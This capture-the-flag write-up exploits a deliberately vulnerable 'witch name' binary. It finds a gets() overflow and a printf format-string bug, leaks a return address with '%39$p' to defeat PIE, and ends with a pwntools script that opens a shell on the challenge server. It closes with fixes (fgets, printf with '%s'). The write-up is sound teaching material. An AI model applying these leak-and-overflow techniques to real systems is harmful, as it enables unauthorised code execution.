# Intro to Pwning 1

When run, the binary first asks us for our witch name, which it then prints back to us and then asks us for a magic spell:
```
$ ./pwn1
Enter your witch name:
Hermione
┌───────────────────────┐
│ You are a Hufflepuff! │
└───────────────────────┘
Hermione enter your magic spell:
Expelliarmus
~ Protego!
```

Looking at the code we can quickly find two vulnerabilities:
1. All user input is read using the `gets` function, which doesn't have a length limit for the input and can therefore be used for buffer overflows.
2. The binary uses `printf` directly to print the entered name, which among other things allows us to leak data from the stack.

We can also find an unused function `WINgardium_leviosa` which opens a shell:
```cpp
void WINgardium_leviosa() {
    printf("┌───────────────────────┐\n");
    printf("│ You are a Slytherin.. │\n");
    printf("└───────────────────────┘\n");
    system("/bin/sh");
}
```

Looking at the `checksec` output we can see that the binary has no stack canary but `PIE` is enabled:
```
$ checksec pwn1
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Because there is no stack canary we can simply use `gets` to overwrite the return address and jump to `WINgardium_leviosa` but
because of `PIE` we first need to find out the base address of the binary.
We can use `printf` for that.

Using `gdb` and `pwndbg` we can find out that the return address is at position `33` on the stack when `printf` is called in `welcome`:
```
pwndbg> disass welcome
...
   0x0000000008000a81 <+94>:    call   0x80007c0 <printf@plt>
...
pwndbg> b *welcome+94
pwndbg> r
pwndbg> stack 50
...
1f:00f8│          0x7ffffffee018 —▸ 0x80009e9 (ignore_me_init_signal+31) ◂— nop     /* 0x48e5894855c35d90 */
20:0100│ rbp      0x7ffffffee020 —▸ 0x7ffffffee040 ◂— 0x0
21:0108│          0x7ffffffee028 —▸ 0x8000b21 (main+45) ◂— mov    eax, 0 /* 0xff5ee800000000b8 */
...
pwndbg> pi 0x21
33
```

Because `printf`'s first six variadic arguments are taken from registers we can leak the address using `%39$p` i.e. printing the 39th argument to `printf` as a pointer which will be the 33rd value on the stack:

```
Enter your witch name:
%39$p
┌───────────────────────┐
│ You are a Hufflepuff! │
└───────────────────────┘
0x7f2461e00b21 enter your magic spell:
```

Taking another look with `gdb` we can also find out the offset between the return address and the `WINgardium_leviosa` function:
```
pwndbg> disass welcome
...
   0x0000000008000a88 <+101>:   ret
...
pwndbg> b *welcome+101
pwndbg> r
pwndbg> stack 1
00:0000│ rsp  0x7ffffffee028 —▸ 0x8000b21 (main+45) ◂— mov    eax, 0 /* 0xff5ee800000000b8 */
pwndbg> p WINgardium_leviosa
$1 = {<text variable, no debug info>} 0x80009ec <WINgardium_leviosa>
pwndbg> pi 0x8000b21 - 0x80009ec
309
```

and the offset between the buffer and the return address for the second `gets`, which is `0x108` bytes:
```
pwndbg> disass AAAAAAAA
...
   0x0000000008000aaf <+38>:    call   0x8000800 <gets@plt>
   0x0000000008000ab4 <+43>:    lea    rax,[rbp-0x100]
...
pwndbg> b *AAAAAAAA+43
pwndbg> c
Hermione enter your magic spell:
AAAAAAAA
pwndbg> stack 50
00:0000│ rax r8 r10 r11 rsp  0x7ffffffedf20 ◂— 'AAAAAAAA'
...
21:0108│                     0x7ffffffee028 —▸ 0x8000b2b (main+55) ◂— nop     /* 0x4157419066c3c990 */
```

We also have to start the input for the second `gets` with `"Expelliarmus\0"` because the program
compares the spell we give it and immediately exits if it's not `"Expelliarmus"`.
Luckily `strcmp` stops at null-bytes but `gets` reads until newlines so this is not a problem.

Trying the exploit will now give a `segfault` in `system` because of a misaligned stack
but we can just jump one instruction later into `WINgardium_leviosa` which will skip a `push`
instruction and align the stack correctly.

The final exploit now looks like this:
```python
#!/usr/bin/env python3

from pwn import *

p = remote("hax1.allesctf.net", 9100)

p.recvuntil("Enter your witch name:")
p.sendline("#%39$p#")

p.recvuntil("#")
leak = p.recvuntil("#")
leak = int(leak[:-1], 16)

log.info(f"Leaked ret address: {leak:#x}")

p.recvuntil(":")

leak += 0x9ec - 0xb1b
log.info(f"Overriding with: {leak:#x}")

payload = b"Expelliarmus\0".ljust(0x108) + p64(leak)
p.sendline(payload)
p.interactive()
```

And running it gives us a shell and the flag:
```
$ ./exploit.py
[+] Opening connection to hax1.allesctf.net on port 9100: Done
[*] Leaked ret address: 0x55dcfcb87b21
[*] Overriding with: 0x55dcfcb879ed
[*] Switching to interactive mode

~ Protego!
┌───────────────────────┐
│ You are a Slytherin.. │
└───────────────────────┘
$ cat flag
CSCG{NOW_PRACTICE_MORE}
```

Clearly, it's better to follow the `man`-pages advice and `Never use gets(). [...] Use fgets() instead.`
And of course letting users control the first argument of `printf` is equally bad.
Instead, `printf("%s", user_input)` should be used.

Next: [Intro to Pwning 2](intro_pwn2.md)
